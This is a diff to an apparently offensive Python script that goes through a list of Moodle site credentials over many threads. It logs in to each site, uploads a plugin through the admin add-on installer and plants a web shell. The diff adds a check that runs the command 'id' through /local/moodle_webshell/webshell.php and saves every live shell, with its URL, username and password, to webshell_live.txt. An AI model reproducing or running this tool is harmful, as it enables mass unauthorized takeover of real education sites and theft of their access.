@@ -4,8 +4,10 @@ import os
 import argparse
 from urllib.parse import urljoin
 from concurrent.futures import ThreadPoolExecutor
+from colorama import Fore, init
 
 requests.packages.urllib3.disable_warnings()
+init(autoreset=True)
 
 def save_result(filename, text):
     os.makedirs("result", exist_ok=True)
@@ -19,6 +21,16 @@ def get_login_token(session, url):
         return token[0] if token else None
     except:
         return None
+
+def check_shell(base_url, session):
+    try:
+        shell_url = urljoin(base_url, "/local/moodle_webshell/webshell.php?action=exec&cmd=id")
+        r = session.get(shell_url, verify=False, timeout=15)
+        if "uid=" in r.text:
+            return shell_url
+    except:
+        return None
+    return None
 
 def process(line):
     try:
@@ -40,6 +52,7 @@ def process(line):
 
         if login.status_code == 303 and "MOODLEID1_=deleted" in login.headers.get("Set-Cookie", ""):
             save_result("login_success.txt", line)
+
             install_url = urljoin(base_url, "/admin/tool/installaddon/index.php")
             r = session.get(install_url, timeout=15, verify=False)
             sesskey = re.findall(r'name="sesskey" value="(.*?)"', r.text)
@@ -68,7 +81,12 @@ def process(line):
 
             if "url" in upload.text:
                 save_result("upload_success.txt", line)
-    except:
+
+                shell = check_shell(base_url, session)
+                if shell:
+                    save_result("webshell_live.txt", f"{url}|{username}|{password}|{shell}")
+
+    except Exception as e:
         pass
 
 def main():
@@ -83,7 +101,8 @@ def main():
     with ThreadPoolExecutor(max_workers=args.thread) as exe:
         exe.map(process, lines)
 
-    print("Selesai! Cek folder 'result'.")
+    print(Fore.GREEN + "\nUPLOAD DONE ✅ Cek folder 'result':")
+    print("- login_success.txt\n- upload_success.txt\n- webshell_live.txt\n")
 
 if __name__ == "__main__":
     main()
